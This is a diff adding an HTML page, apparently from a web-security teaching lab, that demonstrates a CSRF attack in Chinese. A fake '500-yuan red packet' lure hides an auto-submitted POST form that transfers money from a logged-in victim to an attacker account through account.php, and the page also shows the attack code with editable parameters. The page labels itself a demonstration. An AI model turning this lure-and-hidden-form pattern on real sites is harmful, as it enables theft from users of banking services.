@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>恭喜您获得500元红包！</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .attack-container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            width: 100%;
+            max-width: 580px;
+        }
+        .nav-bar {
+            background: #fff;
+            padding: 12px 20px;
+            border-bottom: 1px solid #f0f0f0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-bar .title {
+            color: #ff6b6b;
+            font-weight: 600;
+            font-size: 0.95em;
+        }
+        .nav-bar a {
+            color: #666;
+            text-decoration: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            transition: all 0.3s;
+            font-size: 0.9em;
+        }
+        .nav-bar a:hover {
+            background: #ff6b6b;
+            color: white;
+        }
+        .attack-header {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            color: white;
+            padding: 35px 25px;
+            text-align: center;
+        }
+        .attack-header .icon {
+            font-size: 3.5em;
+            margin-bottom: 12px;
+        }
+        .attack-header h1 {
+            font-size: 1.6em;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        .attack-header p {
+            opacity: 0.95;
+            font-size: 1em;
+        }
+        .attack-body {
+            padding: 25px;
+        }
+        .prize-box {
+            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+            border-radius: 12px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .prize-box .label {
+            color: #e17055;
+            font-size: 0.95em;
+            margin-bottom: 8px;
+        }
+        .prize-box .amount {
+            font-size: 3em;
+            color: #d63031;
+            font-weight: 700;
+            margin: 10px 0;
+        }
+        .warning-box {
+            background: #fff5f5;
+            border: 1px solid #feb2b2;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 18px;
+            color: #c53030;
+        }
+        .warning-box h3 {
+            font-size: 1em;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .warning-box ul {
+            margin-left: 20px;
+            font-size: 0.9em;
+            line-height: 1.6;
+        }
+        .warning-box li {
+            margin: 5px 0;
+        }
+        .param-editor {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 18px;
+        }
+        .param-editor h4 {
+            color: #333;
+            margin-bottom: 12px;
+            font-size: 0.95em;
+            font-weight: 600;
+        }
+        .param-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        .param-row.single {
+            grid-template-columns: 1fr;
+        }
+        .param-group label {
+            display: block;
+            color: #666;
+            font-size: 0.85em;
+            margin-bottom: 5px;
+        }
+        .param-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 0.9em;
+            transition: border-color 0.3s;
+        }
+        .param-group input:focus {
+            outline: none;
+            border-color: #ff6b6b;
+        }
+        .code-section {
+            background: #1e1e1e;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            overflow: hidden;
+        }
+        .code-header {
+            background: #2d2d2d;
+            padding: 12px 15px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .code-header h3 {
+            font-size: 0.9em;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .code-header .btn-toggle {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85em;
+            transition: background 0.3s;
+        }
+        .code-header .btn-toggle:hover {
+            background: #ee5a6f;
+        }
+        .code-body {
+            padding: 15px;
+            display: none;
+        }
+        .code-body.show {
+            display: block;
+        }
+        .code-body textarea {
+            width: 100%;
+            background: #1e1e1e;
+            color: #f8f8f2;
+            border: none;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            line-height: 1.5;
+            resize: vertical;
+            min-height: 180px;
+            padding: 0;
+        }
+        .code-body textarea:focus {
+            outline: none;
+        }
+        .info-box {
+            background: #e8f4f8;
+            border: 1px solid #bee3f8;
+            border-radius: 8px;
+            padding: 12px 15px;
+            color: #2c5282;
+            margin-bottom: 18px;
+            font-size: 0.9em;
+        }
+        .info-box h4 {
+            margin-bottom: 8px;
+            font-size: 0.95em;
+        }
+        .info-box p {
+            margin: 4px 0;
+        }
+        .info-box code {
+            background: rgba(255,255,255,0.5);
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+        .btn-claim {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-claim:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(238,90,111,0.4);
+        }
+        .btn-claim:active {
+            transform: translateY(0);
+        }
+        .hidden-form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="attack-container">
+        <div class="nav-bar">
+            <span class="title">🎯 CSRF攻击演示</span>
+            <a href="../../index.php">🏠 返回主页</a>
+        </div>
+        
+        <div class="attack-header">
+            <div class="icon">🎁</div>
+            <h1>恭喜您！</h1>
+            <p>您获得了一个专属红包</p>
+        </div>
+        
+        <div class="attack-body">
+            <div class="prize-box">
+                <div class="label">红包金额</div>
+                <div class="amount">¥500</div>
+                <div class="label">点击下方按钮立即领取</div>
+            </div>
+            
+            <div class="warning-box">
+                <h3>⚠️ 这是一次CSRF攻击演示</h3>
+                <p>当您点击"立即领取"按钮时，实际上会执行以下操作：</p>
+                <ul>
+                    <li>向银行系统发送隐藏的转账请求</li>
+                    <li>从您的账户向攻击者账户转账 <strong>500元</strong></li>
+                    <li>由于您已登录银行系统，请求会成功执行</li>
+                </ul>
+            </div>
+            
+            <div class="param-editor">
+                <h4>🔧 攻击参数配置（可自由修改）</h4>
+                <div class="param-row">
+                    <div class="param-group">
+                        <label>收款账号</label>
+                        <input type="text" id="to_account" value="6222021234567890456">
+                    </div>
+                    <div class="param-group">
+                        <label>转账金额</label>
+                        <input type="number" id="amount" value="500">
+                    </div>
+                </div>
+                <div class="param-row single">
+                    <div class="param-group">
+                        <label>转账备注</label>
+                        <input type="text" id="remark" value="红包领取">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="code-section">
+                <div class="code-header">
+                    <h3>💻 核心攻击代码</h3>
+                    <button class="btn-toggle" onclick="toggleCode()">显示/隐藏</button>
+                </div>
+                <div class="code-body" id="codeBody">
+                    <textarea id="attackCode" readonly></textarea>
+                </div>
+            </div>
+            
+            <div class="info-box">
+                <h4>🎯 攻击原理</h4>
+                <p>攻击者构造了一个恶意页面，包含自动提交的表单</p>
+                <p>目标：<code>account.php</code> 的转账接口</p>
+                <p>收款账号：<code id="displayAccount">6222021234567890456</code>（李四）</p>
+                <p>转账金额：<code id="displayAmount">500元</code></p>
+            </div>
+            
+            <form id="attackForm" class="hidden-form" method="POST" action="account.php">
+                <input type="hidden" name="action" value="transfer">
+                <input type="hidden" name="to_account" id="form_to_account" value="6222021234567890456">
+                <input type="hidden" name="amount" id="form_amount" value="500">
+                <input type="hidden" name="remark" id="form_remark" value="红包领取">
+            </form>
+            
+            <button type="button" class="btn-claim" onclick="submitAttack()">🎁 立即领取</button>
+        </div>
+    </div>
+    
+    <script>
+        // 初始化代码
+        function initCode() {
+            updateCode();
+        }
+        
+        // 显示/隐藏代码
+        function toggleCode() {
+            const codeBody = document.getElementById('codeBody');
+            codeBody.classList.toggle('show');
+        }
+        
+        // 更新代码显示
+        function updateCode() {
+            const to_account = document.getElementById('to_account').value;
+            const amount = document.getElementById('amount').value;
+            const remark = document.getElementById('remark').value;
+            
+            const code = `<!-- 隐藏的攻击表单 -->
+<form id="attackForm" style="display:none" method="POST" action="account.php">
+    <!-- 关键：没有CSRF Token，攻击可以成功 -->
+    <input type="hidden" name="action" value="transfer">
+    <input type="hidden" name="to_account" value="${to_account}">
+    <input type="hidden" name="amount" value="${amount}">
+    <input type="hidden" name="remark" value="${remark}">
+</form>
+
+<script>
+// 自动提交表单
+function submitAttack() {
+    document.getElementById('attackForm').submit();
+}
+<\/script>`;
+            
+            document.getElementById('attackCode').value = code;
+        }
+        
+        // 实时更新攻击参数
+        document.getElementById('to_account').addEventListener('input', function() {
+            document.getElementById('form_to_account').value = this.value;
+            document.getElementById('displayAccount').textContent = this.value;
+            updateCode();
+        });
+        
+        document.getElementById('amount').addEventListener('input', function() {
+            document.getElementById('form_amount').value = this.value;
+            document.getElementById('displayAmount').textContent = this.value + '元';
+            updateCode();
+        });
+        
+        document.getElementById('remark').addEventListener('input', function() {
+            document.getElementById('form_remark').value = this.value;
+            updateCode();
+        });
+        
+        // 提交攻击
+        function submitAttack() {
+            document.getElementById('form_to_account').value = document.getElementById('to_account').value;
+            document.getElementById('form_amount').value = document.getElementById('amount').value;
+            document.getElementById('form_remark').value = document.getElementById('remark').value;
+            document.getElementById('attackForm').submit();
+        }
+        
+        // 页面加载初始化
+        window.onload = initCode;
+    </script>
+</body>
+</html>
